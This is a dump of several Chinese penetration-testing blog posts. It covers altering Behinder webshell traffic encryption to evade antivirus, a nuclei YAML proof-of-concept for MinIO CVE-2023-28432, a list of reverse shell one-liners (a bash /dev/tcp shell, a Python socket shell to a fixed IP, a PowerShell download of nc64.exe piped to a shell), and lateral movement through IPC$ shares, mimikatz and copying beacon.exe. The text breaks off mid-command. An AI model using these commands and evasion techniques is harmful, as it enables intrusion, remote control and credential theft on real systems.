class="line"><span class="keyword">private</span> <span class="type">byte</span>[] Encrypt(<span class="type">byte</span>[] data) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 添加ROT13加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> data[i];</span><br><span class="line">        <span class="keyword">if</span> (b &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; b &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;  <span class="comment">// 处理小写字母</span></span><br><span class="line">            b = (<span class="type">byte</span>) ((b - <span class="string">&#x27;a&#x27;</span> + <span class="number">13</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; b &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;  <span class="comment">// 处理大写字母</span></span><br><span class="line">            b = (<span class="type">byte</span>) ((b - <span class="string">&#x27;A&#x27;</span> + <span class="number">13</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        data[i] = b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 原有异或加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        data[i] = (<span class="type">byte</span>) (data[i] ^ key.getBytes()[i + <span class="number">1</span> &amp; <span class="number">15</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] Decrypt(<span class="type">byte</span>[] data) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第一步：逆向异或操作（与加密相同）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        data[i] = (<span class="type">byte</span>) (data[i] ^ key.getBytes()[i + <span class="number">1</span> &amp; <span class="number">15</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第二步：逆向ROT13操作（与加密相同）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> data[i];</span><br><span class="line">        <span class="keyword">if</span> (b &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; b &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;  <span class="comment">// 处理小写字母</span></span><br><span class="line">            b = (<span class="type">byte</span>) ((b - <span class="string">&#x27;a&#x27;</span> + <span class="number">13</span>) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; b &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;  <span class="comment">// 处理大写字母</span></span><br><span class="line">            b = (<span class="type">byte</span>) ((b - <span class="string">&#x27;A&#x27;</span> + <span class="number">13</span>) % <span class="number">26</span> + <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        data[i] = b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可用ai將原有的加密方式添加或重新生成新的加密算法<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20210452.png"><br>提示保存成功表示代码没有问题<br>点击分享保存<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20210855.png"><br>将保存的文件放入文件加密解密目录下\net\rebeyond\behinder\resource\transprotocol<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20212509.png"><br>生成的是jsp的文件，如果要使用php的<br>还是使用ai<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20214403.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">    <span class="variable">$keyBytes</span> = <span class="title function_ invoke__">array_values</span>(<span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C*&#x27;</span>, <span class="variable">$key</span>)); <span class="comment">// 将密钥转为字节数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行ROT13加密</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byte</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$byte</span> &gt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>) &amp;&amp; <span class="variable">$byte</span> &lt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$byte</span> = ((<span class="variable">$byte</span> - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$byte</span> &gt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) &amp;&amp; <span class="variable">$byte</span> &lt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$byte</span> = ((<span class="variable">$byte</span> - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$byte</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行异或加密</span></span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$keyIndex</span> = (<span class="variable">$i</span> + <span class="number">1</span>) &amp; <span class="number">15</span>; <span class="comment">// 等同于 (i+1) % 16</span></span><br><span class="line">        <span class="variable">$encryptedByte</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) ^ <span class="variable">$keyBytes</span>[<span class="variable">$keyIndex</span>];</span><br><span class="line">        <span class="variable">$encrypted</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$encryptedByte</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encrypted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$encrypted</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">    <span class="variable">$keyBytes</span> = <span class="title function_ invoke__">array_values</span>(<span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C*&#x27;</span>, <span class="variable">$key</span>)); <span class="comment">// 将密钥转为字节数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第一步：异或解密</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypted</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$keyIndex</span> = (<span class="variable">$i</span> + <span class="number">1</span>) &amp; <span class="number">15</span>; <span class="comment">// 等同于 (i+1) % 16</span></span><br><span class="line">        <span class="variable">$decryptedByte</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$encrypted</span>[<span class="variable">$i</span>]) ^ <span class="variable">$keyBytes</span>[<span class="variable">$keyIndex</span>];</span><br><span class="line">        <span class="variable">$data</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$decryptedByte</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第二步：ROT13解密</span></span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byte</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$byte</span> &gt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>) &amp;&amp; <span class="variable">$byte</span> &lt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$byte</span> = ((<span class="variable">$byte</span> - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$byte</span> &gt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) &amp;&amp; <span class="variable">$byte</span> &lt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$byte</span> = ((<span class="variable">$byte</span> - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$decrypted</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$byte</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20215027.png"><br>后构建项目，再构建工件生成jar文件<br>测试：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20215454.png"><br>其他加密算法：<br>参考此文章<br><a href="https://xz.aliyun.com/news/11899">https://xz.aliyun.com/news/11899</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Poc开发-yml语法</title>
      <link href="/2025/06/17/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-yml%E8%AF%AD%E6%B3%95/"/>
      <url>/2025/06/17/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-yml%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Poc开发-yml语法"><a href="#Poc开发-yml语法" class="headerlink" title="Poc开发-yml语法"></a>Poc开发-yml语法</h1><p>参考文章：<br><a href="https://docs.nuclei.sh/template-guide/introduction">https://docs.nuclei.sh/template-guide/introduction</a><br><a href="https://blog.csdn.net/qq_41315957/article/details/126594572">https://blog.csdn.net/qq_41315957/article/details/126594572</a><br><a href="https://blog.csdn.net/qq_41315957/article/details/126594670">https://blog.csdn.net/qq_41315957/article/details/126594670</a></p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进不允许使用 tab，只允许空格</li><li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li><li>#表示注释</li><li>: 号后面要加空格</li></ul><h2 id="Yaml-Poc模版："><a href="#Yaml-Poc模版：" class="headerlink" title="Yaml Poc模版："></a>Yaml Poc模版：</h2><p>1、编号 id</p><p>2、信息 info</p><p>3、请求 http file tcp等</p><p>4、匹配 matchers Interactsh</p><p>5、提取 extractors</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞的唯一标识符。如果满足了下面匹配器（matchers）中的规则，显示出的就是id的值。</span></span><br><span class="line"><span class="attr">id:</span> <span class="string">CVE-2023-28432</span></span><br><span class="line"><span class="comment">#info为描述信息，不是硬规定一定要有哪些。自己看着办要写哪些</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line"><span class="comment">#漏洞的名称</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">CVE-2023-28432</span></span><br><span class="line"><span class="comment">#漏洞的作者或发现者</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">burp</span> <span class="string">suite</span></span><br><span class="line"><span class="comment">#漏洞的严重程度</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">severity</span></span><br><span class="line"><span class="comment">#漏洞的详细描述。</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    MinIO 是在 GNU Affero 通用公共许可证 v3.0 下发布的高性能对象存储。</span></span><br><span class="line"><span class="string"></span><span class="comment">#漏洞的参考资料，可以是链接地址。</span></span><br><span class="line">  <span class="attr">reference:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://github.com/vulhub/vulhub/tree/master/minio/CVE-2023-28432</span></span><br><span class="line"><span class="comment">#漏洞的标签，用于分类和关联其他相关漏洞。也方便到时候整理归类到库里面去</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">cve,2023</span></span><br><span class="line"><span class="comment">#描述了与该漏洞相关的HTTP请求匹配规则的列表。</span></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line"><span class="comment"># &quot;raw&quot;字段通常指的是原始的HTTP请求字符串。</span></span><br><span class="line"><span class="comment">#使用表单数据时，可以使用form字段。如果你的请求数据是JSON格式的，可以使用json字段。</span></span><br><span class="line"><span class="comment">#对于 URL 编码的数据，可以使用 urlencoded 字段。如果需要模拟文件上传，可以使用 multipart 字段</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line"><span class="comment">#这里面要参考漏洞的触发信息是怎么样的，漏洞需要提交什么样的数据包就怎么编写这里面的内容</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        POST /minio/bootstrap/v1/verify HTTP/1.1</span></span><br><span class="line"><span class="string"></span><span class="comment">#&#123;&#123;Hostname&#125;&#125;是一个变量，不要写死。在你使用nuclei程序使用-target参数指定URL的时候会被填充到这里来</span></span><br><span class="line">        <span class="attr">Host:</span> &#123;&#123;<span class="string">Hostname</span>&#125;&#125;</span><br><span class="line">        <span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line">        <span class="attr">Accept:</span> <span class="string">*/*</span></span><br><span class="line">        <span class="attr">Accept-Language:</span> <span class="string">en-US;q=0.9,en;q=0.8</span></span><br><span class="line">        <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Win64;</span> <span class="string">x64)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/110.0.5481.178</span> <span class="string">Safari/537.36</span></span><br><span class="line">        <span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line">        <span class="attr">Cache-Control:</span> <span class="string">max-age=0</span></span><br><span class="line">        <span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line">        <span class="attr">Content-Length:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义了匹配器的条件，表示所有的匹配器都必须满足。</span></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">    <span class="comment">#匹配器 漏洞条件的特征点写在里面</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line"><span class="comment">#匹配器的类型，用于在响应的特定位置寻找指定的关键字。</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line"><span class="comment"># 指定要匹配的部分是响应的body部分。</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br><span class="line"><span class="comment">#指定要匹配的关键字列表，如果在响应主体中找到了这些关键字，将认为漏洞存在。</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&#x27;MINIO_ROOT_USER&#x27;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&#x27;MINIO_ROOT_PASSWORD&#x27;</span></span><br><span class="line">      <span class="comment">#另一个匹配器类型，用于匹配响应的状态码。</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line"><span class="comment">#指定要匹配的状态码列表，如果响应的状态码为200（成功），将认为漏洞存在。</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure><p>使用方式：nuclei.exe -t Your_YamlFile -target 目标地址</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞发现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞发现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础知识-反弹shell</title>
      <link href="/2025/06/17/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2025/06/17/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识-反弹shell"><a href="#基础知识-反弹shell" class="headerlink" title="基础知识-反弹shell"></a>基础知识-反弹shell</h1><p>常见渗透命令：</p><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p><p>命令生成：</p><p><a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><p>Linux：wget curl python ruby perl java 等</p><p>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等</p><p>反弹 shell 命令：</p><p><a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><p>常见的：<br>linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443    //监听443端口</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/443 0&gt;&amp;1      //linux</span><br><span class="line">Windows:</span><br></pre></td></tr></table></figure><p>python:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.32.130&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p>whindows</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc64.exe：https://github.com/vinsworldcom/NetCat64/releases</span><br><span class="line"></span><br><span class="line">powershell -c wget ip/nc64.exe -outfile \\programdata\\nc64.exe //通过漏洞上传nc64.exe</span><br><span class="line">\\programdata\\nc64.exe -e powershell ip 443</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动-1</title>
      <link href="/2025/06/17/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1/"/>
      <url>/2025/06/17/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1/</url>
      
        <content type="html"><![CDATA[<h1 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动-1"></a>横向移动-1</h1><h2 id="域外用户"><a href="#域外用户" class="headerlink" title="域外用户"></a>域外用户</h2><p>1,尝试提权（system）</p><p>2,获取域内用户（枚举）及凭据<br><a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p><p>Minikatz<br><a href="https://github.com/ParrotSec/mimikatz">https://github.com/ParrotSec/mimikatz</a><br>当系统为win10或者2012R2以上，内存中默认禁止缓存明文密码<br>可通过修改注册表的方式进行抓取，但需要重启后重新登录1时才能抓取</p><p>windows 2012以上默认关闭了Wdigest，所以攻击者无法通过内存获取明文密码<br>针对以上情况，四种解决办法：<br>1，利用（PTH，PTK）等进行移动，不需要密码<br>2，利用其他服务协议（SMB&#x2F;WMI 等进行哈希移动）<br>3，利用注册表开启（wdigest auth）进行获取<br>4，利用工具或者第三方平台（HASHCAT进行破解获取）</p><h2 id="IPC域内移动"><a href="#IPC域内移动" class="headerlink" title="IPC域内移动"></a>IPC域内移动</h2><p>IPC是共享“命名管道”的资源，它是一个用于程序通讯的开放管道，通过提供一个可信的用户和密码，连接双方可以建立一个安全通道并通过这个通道交换加密数据，从而实现对远程计算机的访问。需要使用目标系统用户的账户密码，使用139，445端口<br>1，建立IPC链接到目标主机<br>2，拷贝要执行的命令脚本到目标主机<br>3，查看目标时间，创建计划任务（at，schtasks）定时执行拷贝到的脚本<br>4，删除IPC链接<br>建立失败原因：<br>1，目标主机不是NT或以上的操作系统<br>2，对方没有打开IPC$共享<br>3，对方未开启139，445端口，或者被防火请屏蔽<br>4，输出命令，账号密码有错误</p><h3 id="IPC-利用命令："><a href="#IPC-利用命令：" class="headerlink" title="IPC$利用命令："></a>IPC$利用命令：</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\server\ipc$ &quot;password&quot; /user:计算机名\username #工作组</span><br><span class="line"><span class="built_in">net</span> use \\server\ipc$ &quot;password&quot; /user:domain\username #域内</span><br><span class="line"><span class="built_in">dir</span> \\xx.xx.xx.xx\C$\   #查看文件</span><br><span class="line"><span class="built_in">copy</span> \\xx.xx.xx.xx\C$\<span class="number">1</span>.bat <span class="number">1</span>.bat #下载文件</span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.bat \\\\xx.xx.xx.xx\C$ #复制文件</span><br><span class="line"><span class="built_in">net</span> use \\xx.xx.xx.xx\C$\<span class="number">1</span>.bat /<span class="built_in">del</span> #删除IPC</span><br><span class="line"><span class="built_in">net</span> view xx.xx.xx.xx #查看对方共享</span><br></pre></td></tr></table></figure><p>域内用户权限：webadmin权限</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip\ipc$ &quot;密码&quot; /user:计算机名\administrator</span><br><span class="line"><span class="built_in">net</span> use \\ip\ipc$ &quot;密码&quot; /user:domain\username</span><br></pre></td></tr></table></figure><p>域外用户权限：administrator权限</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip\ipc$ &quot;密码&quot; /user:计算机名\administrator</span><br><span class="line"><span class="built_in">net</span> use \\ip\ipc$ &quot;密码&quot; /user:domain\username</span><br></pre></td></tr></table></figure><h3 id="at-schtasks-计划任务配合"><a href="#at-schtasks-计划任务配合" class="headerlink" title="at &amp; schtasks 计划任务配合"></a>at &amp; schtasks 计划任务配合</h3><h4 id="1-at-Windows2012"><a href="#1-at-Windows2012" class="headerlink" title="1,at &lt; Windows2012"></a>1,at &lt; Windows2012</h4><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> beacon,exe \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span>\c$ 